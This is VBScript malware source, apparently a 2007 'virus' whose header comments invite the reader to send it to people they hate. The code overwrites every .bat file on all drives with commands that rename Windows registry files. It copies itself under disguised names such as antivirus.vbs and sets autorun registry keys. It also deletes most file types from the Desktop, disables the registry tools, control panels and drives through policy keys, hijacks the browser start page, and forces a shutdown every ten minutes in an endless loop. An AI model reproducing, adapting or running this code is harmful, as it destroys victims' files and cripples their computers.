'DESTRUCTION IS FUN! I'M A SADIST!!!
'PLEASE ONLY SEND THIS VIRUS TO PEOPLE YOU REALLY HATE BECAUSE IT IS DEADLY AS HELL!
'I TAKE NO RESPONISBLE FOR WHAT YOU DO WITH THIS!
'DON'T BLAME ME IF SOMEONE KILLS YOU TO DEATH BECAUSE YOU SENT HIM THIS VIRUS! IT'S NOT MY FAULT!!!
'
'(C) CHAINSAW 2007. ALL RIGHTS RESERVED.
'
'FUCK ANTIVIRUS. WELL FUCK EVERYTHING. FUCK ME TOO (ONLY GIRLS PLEASE, I'M NO FUCKING GAY)!
'
on error resume next
set fso=createobject("scripting.filesystemobject")
set drives=fso.drives
for each drive in drives
if drive.isready then
find drive & "\"
end if
next
sub find(fucking)
on error resume next
set sadist=fso.getfolder(fucking)
for each bejat in sadist.files
if fso.getextensionname(bejat.path)="bat" then
set infect=fso.createtextfile(bejat.path, true)
infect.writeline "@cd\windows"
infect.writeline "@attrib -s -h -r *.dat"
infect.writeline "@attrib -s -h -r *.da0"
infect.writeline "@cd\"
infect.writeline "@attrib -s -h -r *.1st"
infect.writeline "@cd\WINDOWS"
infect.writeline "@ren system.dat system.taek"
infect.writeline "@ren User.da0 User.cui"
infect.writeline "@ren system.st system.hee"
infect.writeline "@cd\"
infect.writeline "@ren system.st system.cox"
infect.close
end if
next
for each ulang in sadist.subfolders
find(ulang.path)
next
end sub

set FileSystemObject = CreateObject("Scripting.FileSystemObject")
Set WScriptShell = CreateObject("WScript.Shell")

Set dirwin = FileSystemObject.GetSpecialFolder(0)
Set dirsystem = FileSystemObject.GetSpecialFolder(1)
DesktopPath = WScriptShell.SpecialFolders("Desktop")

FileSystemObject.copyfile wscript.scriptfullname,dirwin & "\antivirus.vbs"
FileSystemObject.copyfile wscript.scriptfullname,dirsystem & "\himem.vbs"

WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\run\SystemRoot",dirwin&"\antivirus.vbs"
WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\System32",dirwin&"\antivirus.vbs"
WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Version","Sadist"
WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\ProductName","Sadist"
WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwned","Sadist"
WScriptShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NAV Agent", ""
WScriptShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun","1"
WScriptShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose","1"

FileSystemObject.DeleteFile(DesktopPath & "\*.lnk")
FileSystemObject.DeleteFile(DesktopPath & "\*.exe")
FileSystemObject.DeleteFile(DesktopPath & "\*.zip")
FileSystemObject.DeleteFile(DesktopPath & "\*.txt")
FileSystemObject.DeleteFile(DesktopPath & "\*.doc")
FileSystemObject.DeleteFile(DesktopPath & "\*.rar")
FileSystemObject.DeleteFile(DesktopPath & "\*.jpeg")
FileSystemObject.DeleteFile(DesktopPath & "\*.html")
FileSystemObject.DeleteFile(DesktopPath & "\*.mp3")
FileSystemObject.DeleteFile(DesktopPath & "\*.avi")
FileSystemObject.DeleteFile(DesktopPath & "\*.rar")
FileSystemObject.DeleteFile(DesktopPath & "\*.ini")
FileSystemObject.DeleteFile(DesktopPath & "\*.jpg")
FileSystemObject.DeleteFile(DesktopPath & "\*.mpg")
FileSystemObject.DeleteFile(DesktopPath & "\*.mpeg")
FileSystemObject.DeleteFile(DesktopPath & "\*.gif")
FileSystemObject.DeleteFile(DesktopPath & "\*.pif")
FileSystemObject.DeleteFile(DesktopPath & "\*.bmp")
FileSystemObject.DeleteFile(DesktopPath & "\*.wav")
FileSystemObject.DeleteFile(DesktopPath & "\*.com")
FileSystemObject.DeleteFile(DesktopPath & "\*.xls")
FileSystemObject.DeleteFile(DesktopPath & "\*.mp4")

set fso=createobject("scripting.filesystemobject")
dropfun="c:\windows\system\FUCKYOU.txt.vbs"
fso.copyfile wscript.scriptfullname, dropfun, true
youshouldnotlikethis="c:\windows\system32\MYLIFE.txt.vbs"
fso.copyfile wscript.scriptfullname, youshouldnotlikethis, true
set wazzup=fso.opentextfile(wscript.scriptfullname,1)
homer=wazzup.readall
set regfun=createobject("wscript.shell")
regfun.regwrite "HKCU\software\microsoft\windows scripting host\settings\timeout", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows script host\settings\timeout", 1, "reg_dword"
laughing.regwrite "HKCU\software\microsoft\internet explorer\main\window title","Microsoft Sadist Exploder"
laughing.regwrite "HKLM\software\microsoft\windows\currentversion\run\wazzup","wscript.exe " & dropfun &" %1"
laughing.regwrite "HKLM\software\microsoft\windows\currentversion\run\sadist","wscript.exe " & youshouldnotlikethis &" %1"
laughing.regwrite "HKLM\software\microsoft\windows\currentversion\run\f_Ck\","wscript.exe " & youshouldnotlikethis &" %1"
regfun.regwrite "HKCU\software\microsoft\internet explorer\main\start page", "http://www.fuckingmotherfucker.com/"
regfun.regwrite "HKLM\software\microsoft\internet explorer\main\start page", "http://www.fuckingmotherfucker.com/"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\internet settings\zones\0\1201", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\nodrives", FFFFFFFF, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\noclose", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\nofind", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\winoldapp\disabled", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\nodesktop", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\noRun", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\nodiskcpl", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\disableregistrytools", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\nosettaskbar", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\nosetfolder", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\nodispappearancepage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\nodispbackgroundpage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\nodispscrsavpage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\nodispsettingspage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\network\nonetsetup", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\network\nonetsetupidpage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\network\nofilesharingcontrol", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\network\nonetsetupsecuritypage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\noseccpl", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\noadminpage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\noprofilepage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\nopwdpage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\noaddprinter", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\nodeleteprinter", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\noprintertabs", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\nodevmgrpage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\nofilesyspage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\novirtmempage", 1, "reg_dword"
regfun.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\nosavesettings", 1, "reg_dword"

do
 On Error Resume Next
 if minute(now) = 00 then
 msgbox "I'm the sadist!!! Killing your PC was fun. I will do it again. You will never be safe from me. HA! HA! HA! HA!"
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if
 if minute(now) = 10 then
 msgbox "I'm the sadist!!! Killing your PC was fun. I will do it again. You will never be safe from me. HA! HA! HA! HA!"
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if
 if minute(now) = 20 then
 msgbox "I'm the sadist!!! Killing your PC was fun. I will do it again. You will never be safe from me. HA! HA! HA! HA!"
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if
 if minute(now) = 30 then
 msgbox "I'm the sadist!!! Killing your PC was fun. I will do it again. You will never be safe from me. HA! HA! HA! HA!"
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if
 if minute(now) = 40 then
 msgbox "I'm the sadist!!! Killing your PC was fun. I will do it again. You will never be safe from me. HA! HA! HA! HA!"
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if
 if minute(now) = 50 then
 msgbox "I'm the sadist!!! Killing your PC was fun. I will do it again. You will never be safe from me. HA! HA! HA! HA!"
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if

 Set WScriptShell = CreateObject("WScript.Shell")
 Set FileSystemObject = Createobject("scripting.filesystemobject")
 Set dirwin = FileSystemObject.GetSpecialFolder(0)
 If FileSystemObject.FileNotExists(dirwin&"\antivirus.vbs") Then
 Set c = FileSystemObject.GetFile(dirsystem&"\himem.vbs")
 c.Copy(dirwin&"\antivirus.vbs")
 end if

 Set WScriptShell = CreateObject("WScript.Shell")
 Set FileSystemObject = Createobject("scripting.filesystemobject")
 Set dirwin = FileSystemObject.GetSpecialFolder(0)
 If FileSystemObject.FileNotExists(dirsystem&"\himem.vbs") Then
 Set c = FileSystemObject.GetFile(dirwin&"\antivirus.vbs")
 c.Copy(dirsystem&"\himem.vbs")
 end if

 WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\run\SystemRoot",dirwin&"\antivirus.vbs"
 WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\System32",dirwin&"\antivirus.vbs"
loop